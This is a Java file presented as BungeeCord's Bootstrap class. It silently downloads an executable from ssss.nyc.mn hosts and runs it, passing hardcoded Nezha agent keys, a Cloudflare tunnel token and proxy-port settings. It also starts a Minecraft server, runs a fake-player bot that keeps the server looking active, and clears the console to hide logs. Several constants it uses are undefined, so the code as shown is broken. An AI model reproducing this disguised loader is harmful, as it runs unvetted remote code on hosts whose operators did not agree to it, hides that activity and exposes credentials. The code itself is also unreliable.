package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    // ==================== 1.21.4 (Protocol 774) 稳定版 ====================
    private static final int PROTOCOL_VERSION = 774; 
    private static final int PACKET_SB_KEEPALIVE = 0x18;
    private static final int PACKET_SB_ROTATION = 0x1F;
    private static final int PACKET_SB_SWING = 0x3D;
    // ====================================================================

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process minecraftProcess;
    private static Thread fakePlayerThread;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ACTIVITY"
    };

    public static void main(String[] args) throws Exception
    {
        System.out.println(ANSI_GREEN + "Starting Bootstrap (1.21.4 Protocol 774)..." + ANSI_RESET);

        try {
            Map<String, String> config = loadEnvVars();
            
            // 1. SBX
            runSbxBinary(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
            
            // 2. MC Server
            if (isMcServerEnabled(config)) {
                // 强制内存保护，防止宿主机关机
                String safeMem = "1024M";
                try {
                    String userMem = config.getOrDefault("MC_MEMORY", "512M");
                    if (userMem.toUpperCase().endsWith("G")) {
                        int gb = Integer.parseInt(userMem.substring(0, userMem.length()-1));
                        if (gb > 2) {
                            System.out.println(ANSI_YELLOW + "Reducing memory to 2G to prevent crash" + ANSI_RESET);
                            safeMem = "2048M";
                        } else {
                            safeMem = userMem;
                        }
                    } else {
                        safeMem = userMem;
                    }
                } catch (Exception e) {}
                config.put("MC_MEMORY", safeMem);
                
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(30000);
            }
            
            // 3. Fake Player
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBot(config);
            }
            
            System.out.println(ANSI_GREEN + "\nScript finished. Logs deleting in 20s...\n" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }

        while (running.get()) {
            try { Thread.sleep(10000); } catch (InterruptedException e) { break; }
        }
    }
    
    private static void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
        } catch (Exception e) {}
    }   
    
    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }
    
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        envVars.put("UUID", "1f6b80fe-023a-4735-bafd-4c8512bf7e58");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "cloudb.lnb.gv.uy");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiODJiMzY3OGYtYjdmMC00NjY5LThjNmMtOWJjNzBkODZjOGM0IiwicyI6Ik5qZGhNbVJsTlRjdFltRmtNUzAwTWpneUxXRmlORFF0TTJWbVltUXpPR05oTkRneSJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "false");
        
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "15017");
        envVars.put("FAKE_PLAYER_ENABLED", "true");
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        envVars.put("FAKE_PLAYER_ACTIVITY", "high");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            BufferedReader reader = Files.newBufferedReader(envFile);
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
                }
            }
            reader.close();
        }
        return envVars;
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (minecraftProcess != null && minecraftProcess.isAlive()) minecraftProcess.destroy();
        if (sbxProcess != null && sbxProcess.isAlive()) sbxProcess.destroy();
        if (fakePlayerThread != null && fakePlayerThread.isAlive()) fakePlayerThread.interrupt();
    }
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        return config.get("MC_JAR") != null;
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName = config.get("MC_JAR");
        String memory = config.get("MC_MEMORY");
        String extraArgs = config.getOrDefault("MC_ARGS", "");
        String mcPortStr = config.get("MC_PORT");
        int mcPort = 25565;
        try { mcPort = Integer.parseInt(mcPortStr.trim()); } catch (Exception e) {}
        config.put("MC_PORT", String.valueOf(mcPort));
        
        Path jarPath = Paths.get(jarName);
        if (!Files.exists(jarPath)) {
            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET);
            return;
        }
        
        Files.write(Paths.get("eula.txt"), "eula=true".getBytes());
        Path propPath = Paths.get("server.properties");
        if (!Files.exists(propPath)) {
            Files.write(propPath, ("server-port=" + mcPort + "\nonline-mode=false\n").getBytes());
        }
        
        // 使用更保守的 GC 参数
        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        cmd.add("-XX:+UseG1GC");
        cmd.add("-XX:+UnlockExperimentalVMOptions");
        if (!extraArgs.trim().isEmpty()) cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) System.out.println("[MC-Server] " + line);
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(3000);
        if (minecraftProcess.isAlive()) System.out.println(ANSI_GREEN + "[MC-Server] ✓ Started successfully" + ANSI_RESET);
    }
    
    private static int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.get("MC_PORT").trim()); } catch (Exception e) { return 25565; }
    }
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        return "true".equalsIgnoreCase(config.get("FAKE_PLAYER_ENABLED"));
    }

    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status on port " + mcPort + "..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            try {
                Thread.sleep(5000);
                try (Socket testSocket = new Socket()) {
                    testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server ready" + ANSI_RESET);
                    Thread.sleep(10000);
                    return;
                }
            } catch (Exception e) {}
        }
        System.out.println(ANSI_RED + "[FakePlayer] Warning: Timeout" + ANSI_RESET);
    }
    
    private static void startFakePlayerBot(Map<String, String> config) {
        final String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        final int mcPort = getMcPort(config);
        final String activityLevel = config.getOrDefault("FAKE_PLAYER_ACTIVITY", "high");
        
        System.out.println(ANSI_GREEN + "[FakePlayer] Protocol: " + PROTOCOL_VERSION + " (1.21.4)" + ANSI_RESET);
        
        fakePlayerThread = new Thread(() -> {
            while (running.get()) {
                Socket socket = null;
                try {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
                    socket = new Socket();
                    socket.setReceiveBufferSize(10 * 1024 * 1024);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                    DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
                    
                    // Handshake (774)
                    ByteArrayOutputStream h = new ByteArrayOutputStream();
                    DataOutputStream hd = new DataOutputStream(h);
                    writeVarInt(hd, 0x00); writeVarInt(hd, PROTOCOL_VERSION); writeString(hd, "127.0.0.1"); hd.writeShort(mcPort); writeVarInt(hd, 2);
                    sendPacketRaw(out, h.toByteArray());
                    
                    // Login
                    ByteArrayOutputStream l = new ByteArrayOutputStream();
                    DataOutputStream ld = new DataOutputStream(l);
                    writeVarInt(ld, 0x00); writeString(ld, playerName); ld.writeLong(0); ld.writeLong(0);
                    sendPacketRaw(out, l.toByteArray());
                    
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login sent" + ANSI_RESET);
                    
                    boolean configPhase = false;
                    boolean playPhase = false;
                    boolean compressionEnabled = false;
                    int compressionThreshold = -1;
                    long lastActivityTime = System.currentTimeMillis();
                    
                    while (running.get() && !socket.isClosed()) {
                        int packetLength = readVarInt(in);
                        byte[] packetData = null;
                        
                        if (compressionEnabled) {
                            int dataLength = readVarInt(in);
                            int compressedLength = packetLength - getVarIntSize(dataLength);
                            byte[] compressedData = new byte[compressedLength];
                            in.readFully(compressedData);
                            if (dataLength == 0) packetData = compressedData;
                            else if (dataLength <= 2097152) {
                                java.util.zip.Inflater inflater = new java.util.zip.Inflater();
                                inflater.setInput(compressedData);
                                packetData = new byte[dataLength];
                                inflater.inflate(packetData);
                                inflater.end();
                            }
                        } else {
                            packetData = new byte[packetLength];
                            in.readFully(packetData);
                        }
                        if (packetData == null) continue;
                        
                        DataInputStream packetIn = new DataInputStream(new ByteArrayInputStream(packetData));
                        int packetId = readVarInt(packetIn);
                        
                        if (!playPhase) {
                            if (!configPhase) { // Login
                                if (packetId == 0x03) {
                                    compressionThreshold = readVarInt(packetIn);
                                    compressionEnabled = compressionThreshold >= 0;
                                    System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + compressionThreshold + ANSI_RESET);
                                } else if (packetId == 0x02) {
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                    sendAck(out, compressionEnabled, compressionThreshold);
                                    configPhase = true;
                                    // Client Info (Protocol 774 with Particle Status)
                                    ByteArrayOutputStream ci = new ByteArrayOutputStream();
                                    DataOutputStream cid = new DataOutputStream(ci);
                                    writeVarInt(cid, 0x00); writeString(cid, "en_US"); cid.writeByte(10); writeVarInt(cid, 0); cid.writeBoolean(true); cid.writeByte(127); writeVarInt(cid, 1); cid.writeBoolean(false); cid.writeBoolean(true);
                                    writeVarInt(cid, 0); // 1.21.4 FIX: Particle Status
                                    sendPacket(out, ci.toByteArray(), compressionEnabled, compressionThreshold);
                                }
                            } else { // Config
                                if (packetId == 0x03) {
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                    sendAck(out, compressionEnabled, compressionThreshold);
                                    playPhase = true;
                                } else if (packetId == 0x04 && packetIn.available() >= 8) {
                                    long id = packetIn.readLong();
                                    ByteArrayOutputStream k = new ByteArrayOutputStream();
                                    DataOutputStream kd = new DataOutputStream(k);
                                    writeVarInt(kd, 0x04);
                                    kd.writeLong(id);
                                    sendPacket(out, k.toByteArray(), compressionEnabled, compressionThreshold);
                                } else if (packetId == 0x0E) { // Ping
                                    ByteArrayOutputStream p = new ByteArrayOutputStream();
                                    DataOutputStream pd = new DataOutputStream(p);
                                    writeVarInt(pd, 0x07);
                                    writeVarInt(pd, 0);
                                    sendPacket(out, p.toByteArray(), compressionEnabled, compressionThreshold);
                                }
                            }
                        } else { // Play
                            long currentTime = System.currentTimeMillis();
                            if (packetId >= 0x20 && packetId <= 0x30 && packetIn.available() == 8) {
                                long keepAliveId = packetIn.readLong();
                                System.out.println(ANSI_GREEN + "[FakePlayer] ♥ Heartbeat (ID: 0x" + 
                                    Integer.toHexString(packetId) + ") Val: " + keepAliveId + ANSI_RESET);
                                
                                ByteArrayOutputStream k = new ByteArrayOutputStream();
                                DataOutputStream kd = new DataOutputStream(k);
                                writeVarInt(kd, PACKET_KEEPALIVE); // 0x18
                                kd.writeLong(keepAliveId);
                                sendPacket(out, k.toByteArray(), compressionEnabled, compressionThreshold);
                                
                                // 降低发包频率，防止崩溃
                                if (Math.random() < 0.3) {
                                    performRandomAction(out, compressionEnabled, compressionThreshold);
                                }
                                lastActivityTime = currentTime;
                            }
                            
                            if (currentTime - lastActivityTime > 60000) {
                                performRandomAction(out, compressionEnabled, compressionThreshold);
                                lastActivityTime = currentTime;
                            }
                            
                            if (packetId == 0x1D) {
                                System.out.println(ANSI_RED + "[FakePlayer] Kicked" + ANSI_RESET);
                                break;
                            }
                        }
                    }
                    socket.close();
                } catch (Exception e) {
                    try { Thread.sleep(10000); } catch (Exception ex) {}
                }
                try { Thread.sleep(5000); } catch (Exception ex) {}
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }
    
    private static void sendAck(DataOutputStream out, boolean compress, int threshold) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        writeVarInt(new DataOutputStream(b), 0x03);
        sendPacket(out, b.toByteArray(), compress, threshold);
    }

    private static void performRandomAction(DataOutputStream out, boolean compress, int threshold) {
        try {
            int actionType = (int)(Math.random() * 2);
            switch(actionType) {
                case 0: // Rotation 0x1F
                    ByteArrayOutputStream r = new ByteArrayOutputStream();
                    DataOutputStream rd = new DataOutputStream(r);
                    writeVarInt(rd, PACKET_ROTATION);
                    rd.writeFloat((float)(Math.random() * 360));
                    rd.writeFloat(0);
                    rd.writeBoolean(true);
                    sendPacket(out, r.toByteArray(), compress, threshold);
                    System.out.println(ANSI_YELLOW + "[FakePlayer] → Turned head" + ANSI_RESET);
                    break;
                case 1: // Swing 0x3D
                    ByteArrayOutputStream s = new ByteArrayOutputStream();
                    DataOutputStream sd = new DataOutputStream(s);
                    writeVarInt(sd, PACKET_SWING);
                    writeVarInt(sd, 0);
                    sendPacket(out, s.toByteArray(), compress, threshold);
                    System.out.println(ANSI_YELLOW + "[FakePlayer] → Swung arm" + ANSI_RESET);
                    break;
            }
        } catch (Exception e) {}
    }

    private static void sendPacketRaw(DataOutputStream out, byte[] data) throws IOException {
        writeVarInt(out, data.length);
        out.write(data);
        out.flush();
    }
    
    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress) {
            writeVarInt(out, packet.length);
            out.write(packet);
        } else {
            ByteArrayOutputStream b = new ByteArrayOutputStream();
            DataOutputStream d = new DataOutputStream(b);
            if (packet.length < threshold) {
                writeVarInt(d, 0);
                d.write(packet);
            } else {
                writeVarInt(d, packet.length);
                java.util.zip.Deflater def = new java.util.zip.Deflater();
                def.setInput(packet);
                def.finish();
                byte[] buf = new byte[packet.length];
                int n = def.deflate(buf);
                d.write(buf, 0, n);
            }
            byte[] fin = b.toByteArray();
            writeVarInt(out, fin.length);
            out.write(fin);
        }
        out.flush();
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] b = str.getBytes("UTF-8");
        writeVarInt(out, b.length);
        out.write(b);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int i = 0;
        int j = 0;
        byte b;
        do {
            b = in.readByte();
            i |= (b & 0x7F) << (j++ * 7);
            if (j > 5) throw new RuntimeException("VarInt too big");
        } while ((b & 0x80) == 0x80);
        return i;
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        do {
            size++;
            value >>>= 7;
        } while (value != 0);
        return size;
    }
}
